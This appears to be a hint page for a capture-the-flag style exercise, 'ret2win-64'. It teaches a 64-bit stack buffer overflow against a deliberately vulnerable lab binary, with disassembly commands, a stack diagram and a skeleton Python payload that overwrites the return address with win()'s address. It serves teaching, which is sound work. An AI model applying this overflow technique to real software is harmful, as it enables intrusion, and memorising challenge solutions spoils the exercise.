# ret2win-64: background and hints

## Background

The same technique as `bof-baseline`, with two changes: the buffer belongs to a helper
function, `vuln()`, and the input is read by `scanf("%s")`. From the module's **Start
here** lesson you need:

- **Concept 1, the stack frame:** every function has its own frame. `vuln()`'s return address
  sits at `[rbp+8]` **inside `vuln()`**, and it points back into `main()`.
- **Concept 2, input functions:** `scanf("%s")` has no size limit and stops at whitespace,
  not at a zero byte.
- **Concept 4, `ret`**, and **Concept 5, little-endian** (`p64`).

The lesson's worked example uses a helper function too (`greet()` is called by `main()`),
with different numbers. A cyclic pattern contains only letters, so it passes through
`scanf("%s")` unchanged; add a newline at the end.

### How to start

```bash
/challenge/ret2win-64                                      # run it once; type a short name
nm /challenge/ret2win-64 | grep -E ' (win|vuln|main)$'     # the functions that matter
objdump -d -M intel /challenge/ret2win-64 | more           # then type /<vuln>: and press Enter
```

---

## Hints

Open one hint at a time. Stop as soon as you can continue on your own.

---

## Hint 1: find win()

<details>
<summary>Show hint 1</summary>

```bash
nm /challenge/ret2win-64 | grep win
```

The first column is `win()`'s address. Because there is no PIE, it is the same every run.

</details>

---

## Hint 2: look inside vuln(), not main()

<details>
<summary>Show hint 2</summary>

```bash
objdump -d -M intel /challenge/ret2win-64 | more
```

Type `/<vuln>:` and press Enter (Space shows the next page, `q` quits). Find `call ... <__isoc99_scanf@plt>` (that is how `scanf` appears in the disassembly). A few lines before it, an `lea rax,[rbp-0x...]` computes the address of the buffer `scanf` writes to. That `[rbp-0x...]` is where your input starts.

You will also see another local variable at a different `[rbp-0x...]`. It is not the target this time; your input runs over it on the way up.

</details>

---

## Hint 3: draw vuln()'s stack

<details>
<summary>Show hint 3</summary>

```
higher addresses
  [rbp+8]  vuln()'s saved return address  <- put win()'s address here
  [rbp]    saved rbp (8 bytes)            <- filler
  ...      other locals and gaps          <- filler
  [rbp-B]  first byte of the name buffer  <- scanf starts writing here
lower addresses
```

Count every byte from `[rbp-B]` up to the saved return address. That count is your filler length. Take `B` from the disassembly, not from a guess about the buffer's declared size.

</details>

---

## Hint 4: check your address for whitespace

<details>
<summary>Show hint 4</summary>

Pack the address as 8 little-endian bytes with `struct.pack("<Q", address)` (or pwntools' `p64(address)`). Then look at those bytes:

```python
import struct
print(struct.pack("<Q", win).hex(" "))
```

`scanf("%s")` stops at these bytes: `09 0a 0b 0c 0d 20` (tab, newline, other line breaks, space). If any of them appears in your address, `scanf` cuts your input there. For this challenge the address is safe, but make the check a habit: it matters in later challenges.

The `00` bytes at the end of the address are fine for `scanf`.

</details>

---

## Hint 5: send it

<details>
<summary>Show hint 5</summary>

```python
import struct, subprocess

filler = ...    # your count from hint 3
win    = ...    # the address from hint 1

payload = b"A" * filler + struct.pack("<Q", win) + b"\n"
result = subprocess.run(["/challenge/ret2win-64"], input=payload, capture_output=True)
print(result.stdout.decode(errors="replace"))
```

The trailing `b"\n"` ends the word for `scanf`. If you only see the greeting and then a crash, your filler length is off: recount from hint 3, remembering the 8 bytes of saved `rbp`.

</details>
